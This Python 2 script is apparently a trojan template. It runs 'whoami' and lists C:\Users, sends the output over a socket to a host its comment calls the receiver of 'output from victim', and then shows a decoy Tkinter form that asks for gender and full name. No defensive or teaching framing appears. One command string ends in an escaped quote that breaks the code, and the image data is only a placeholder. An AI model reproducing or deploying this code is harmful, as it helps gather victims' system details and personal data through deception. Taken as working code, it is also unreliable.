import subprocess,socket


CMD =  subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
whoami = CMD.stdout.read()
CMD =  subprocess.Popen('dir C:\\Users\', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
dir = CMD.stdout.read()


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',1111)) #host/port to recieve output from victim
s.send(whoami + '\n------------------\n' + dir)
s.close()

import base64
import Tkinter,tkMessageBox



gifBase = '''IMAGE's BASE64'''


class App:
    def __init__(self):

        self.root = Tkinter.Tk()
        

        self.root.call('wm', 'attributes', '.', '-topmost', True)
        

        self.root.title("Rekter Application")
        
     
        bgColor = "#EDEDED"
        self.root.configure(bg=bgColor)
        
       

        self.Values = {}
      
        gif = Tkinter.PhotoImage(data = gifBase)
        displayGif = Tkinter.Label(self.root, image = gif, borderwidth = 10, bg = bgColor).grid(row = 0, rowspan = 6, columnspan = 2)
        


        Tkinter.Label(self.root, text = "Your gender:", font=("Helvetica Neue Bold", 14), bg = bgColor).grid(row = 0, column = 2, columnspan = 3, padx = (0, 10), pady = (10, 5), sticky = 'w')
        


        self.Values['BoxSync'] = Tkinter.IntVar()


        Tkinter.Checkbutton(self.root, text = "M", font=("Helvetica Neue", 14), variable = self.Values['BoxSync'], bg = bgColor).grid(row = 1, column = 2, sticky = 'w')
        
        self.Values['CrashPlan'] = Tkinter.IntVar()
        Tkinter.Checkbutton(self.root, text = "F", font=("Helvetica Neue", 14), variable = self.Values['CrashPlan'], bg = bgColor).grid(row = 1, column = 3, columnspan = 2, padx = (0, 10), sticky = 'w')
        
       
        
        Tkinter.Label(self.root, text = "Enter your informations :", font=("Helvetica Neue Bold", 14), bg = bgColor).grid(row = 2, column = 2, columnspan = 4, padx = 10, sticky = 'w')
        Tkinter.Label(self.root, text = "Full Name:", font=("Helvetica Neue", 14), bg = bgColor).grid(row = 3, column = 2, padx = 10, sticky = 'w')


        self.TicketNumber = Tkinter.StringVar()
        Tkinter.Entry(self.root, textvariable = self.TicketNumber, justify = 'right', width = 10, font=("Helvetica Neue", 14), highlightbackground = bgColor).grid(row = 3, column = 3, columnspan = 2, sticky = 'w')
        
      
        Frame1 = Tkinter.Frame(self.root, borderwidth = 1, relief = 'sunken')


        Frame1.grid(row = 4, column = 1, columnspan = 5, padx = 5)
        
    

        Tkinter.Button(self.root, text = "Quit", highlightbackground = bgColor, command = self.Exit).grid(row = 8, column = 3, pady = (5, 5), sticky = 'e')
        Tkinter.Button(self.root, text = "Validate", highlightbackground = bgColor, command = self.Submit).grid(row = 8, column = 4, pady = (5, 5), sticky = 'e')
        

        self.root.withdraw()
        self.root.update_idletasks()
        

        x = (self.root.winfo_screenwidth() - self.root.winfo_reqwidth()) / 2
        y = (self.root.winfo_screenheight() - self.root.winfo_reqheight()) / 3
        self.root.geometry("+{0}+{1}".format(x, y))
        

        self.root.resizable(False,False)

        self.root.deiconify()
        self.root.mainloop()
        
    def Exit(self):

        self.root.destroy()
        
    def Submit(self):
        tkMessageBox.showinfo("Success", "Thank you")


    	
# Calling the class will execute our GUI.
App()
